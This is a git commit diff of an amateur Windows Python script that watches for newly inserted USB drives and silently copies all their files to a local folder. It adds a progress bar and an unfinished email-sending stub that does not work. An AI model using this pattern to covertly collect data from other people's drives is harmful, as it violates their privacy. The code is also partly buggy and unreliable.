9fe22b8e17d636d227498454fd563ec0d8f2b6b2
skajer <kacperrudy128@gmail.com>
2023-09-24 21:33:06 +0200

    swiety gral
    😎😎💪

--- __launcher.py
+++ __launcher.py
@@ -1,141 +1,94 @@
-
-#TODO 1. Check size of folder/folders that script copies,  2. Add timer to the end of copying,  3. Work on if statements, 4. Add progress bar or smth, 5. sending email ~ hour
-#* 1 - 
-#* 2 - 
-#* 3 ✓
-#* 4 - 
-
-#! USE THIS SCRIPT FOR YOUR OWN RISK 
-
-#? THIS SCRIPT IS MONITORING THAT IF NEW DEVICES (PENDRIVES) ARE  
-
 import os
-from socket import herror 
-import time 
 import shutil
 import subprocess
-import smtplib
+import time
 from string import digits
-from datetime import datetime, timedelta
-from distutils.dir_util import copy_tree
-#import pseduo_progress_bar
+from datetime import datetime
+import sys
+import smtplib
+import ssl
 
 
-if os.name != "nt":
-    exit()
+def emails(email, port):
+    
+    port = 465 
+    email = "email@gmail.com"
+    context = ""
 
-def script():
-    print('')
+    with smtplib.SMTP_SSL(email,port,context=context) as server:
+        server.login(email, password="")
+        server.send_message()
+        #....
+        #....
 
-if __name__ == '__main':
-    script()
 
 def diff(list1, list2):
     list_difference = [item for item in list1 if item not in list2]
     return list_difference
 
-def choice():
+def copy_with_progress(src, dst):
+    total_size = sum(os.path.getsize(os.path.join(root, file)) for root, _, files in os.walk(src) for file in files)
+    bytes_copied = 0
 
-    print("Choice 1 to send emails: ")
-    user_choice = int(input())
+    for root, dirs, files in os.walk(src):
+        for file in files:
+            src_file = os.path.join(root, file)
+            dst_file = os.path.join(dst, os.path.relpath(src_file, src))
 
-    if user_choice == 1:
-       # mails():
-        pass
+            if not os.path.exists(os.path.dirname(dst_file)):
+                os.makedirs(os.path.dirname(dst_file))
 
+            shutil.copy2(src_file, dst_file)
+            bytes_copied += os.path.getsize(src_file)
 
-def main():
+            
+            progress = min(100, int(bytes_copied / total_size * 100))
+    print(f"\rCopying... [{('#' * (progress // 5)).ljust(20)}] {progress}% complete", end="")
+    sys.stdout.flush()
 
-    save_path = "C:/save_files" ### whatever path you want 
-
+if __name__ == '__main__':
+    save_path = "C:/save_files"
     dl = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
-
     drives = ['%s:' % d for d in dl if os.path.exists('%s:' % d)]
-
-    print(drives)
-    pass
-
     uncheckeddrives = ['%s:' % d for d in dl if os.path.exists('%s:' % d)]
-
     x = diff(uncheckeddrives, drives)
 
     while True:
-
         if x:
             print("New drives:     " + str(x))
-            print("New dive introduced")
+            print("New drive introduced")
             print("...")
 
             pc_name = os.environ['COMPUTERNAME']
-            
             out = subprocess.check_output('wmic logicaldisk get  DriveType, caption', shell=True)
 
-            while True: 
-
+            while True:
                 for drive in str(out).strip().split('\\r\\r\\n'):
-                        
-                    if '2' in drive:                
+                    if '2' in drive:
                         drive_litter = drive.replace(' ', '').translate({ord(k): None for k in digits}) + '/'
-
                         print(drive_litter)
                         print("\n")
-
                         datetime_help = datetime.now().strftime("%Y%m%d_%H%M%S")
 
                         if os.path.exists(drive_litter):
-                            print("copying...   ")              #prograss bar here
-
-                            #progras_bar_here() >>>> 
+                            print("Copying...")
 
                             path_check_size = save_path + pc_name + datetime_help
 
                             try:
-                                shutil.copytree(drive_litter, os.path.join(save_path, pc_name, datetime_help)) 
-                            except:
-                                Exception, FileNotFoundError
+                                copy_with_progress(drive_litter, os.path.join(save_path, pc_name, datetime_help))
+                            except Exception as e:
+                                print("Error while copying:", e)
 
-                                print("Drive disconnected, removing target folder...  ")
-
-                                datetime_help = str()
-
-                                print(f"Removing {datetime_help} in {save_path}... % ")
-                                try:
-                                    s = os.rmdir(save_path + "/" + pc_name + "/" + datetime_help) 
-                                    p = (save_path + "/" + pc_name + "/" + datetime_help) 
-                                    lk = "Copied succesfully!" + '\n'
-                                    print(lk)
-                                   
-                                except:
-                                    #progress_bar here
-                                    print("Didn't find the folder")
-                                    Exception, FileNotFoundError, IOError
-
-                            # checking folder size
-
-                            lk = "Copied succesfully!" + '\n'
-                            print(lk)
-
-                            #size = os.path.getsize(path_check_size)
-                            #print(f"Folder weights {size} ...")
-                            #time.sleep(0.5)
-                            #size_in_MB = size * 1000000
-                          #  #print(f"Folder weights {size_in_MB} ...")
-                            #time.sleep(0.5)
-                            
-
-                            f = open(p)
-                            f.seek(0, os.SEEK_END)
-                            print('Size of folder is', f.tell(), 'bytes')
+                            print("\nCopied successfully!")
+                        
                 break
-                
 
         x = diff(drives, uncheckeddrives)
 
         if x:
             print("Removed drives: " + str(x))
             print("Drive disconnected")
+
         drives = ['%s:' % d for d in dl if os.path.exists('%s:' % d)]
-
-while True:
-
-    main()
+        time.sleep(1)
